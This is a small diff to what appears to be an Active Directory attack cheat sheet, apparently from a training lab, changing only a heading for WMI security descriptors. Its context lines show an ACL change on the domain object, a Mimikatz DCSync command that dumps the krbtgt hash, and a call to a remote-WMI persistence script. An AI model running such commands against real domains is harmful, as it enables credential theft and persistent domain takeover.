@@ -22,7 +22,7 @@
    * [ACL](#ACL)
       * [AdminSDHolder](#AdminSDHolder)
       * [DCsync](#DCsync)
-      * [SecurityDescriptor WMI](#SecurityDescriptor-WMI)
+      * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)
       * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
       * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
       
@@ -543,7 +543,7 @@ Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-### SecurityDescriptor WMI
+### SecurityDescriptor - WMI
 ```
 . ./Set-RemoteWMI.ps1
 ```
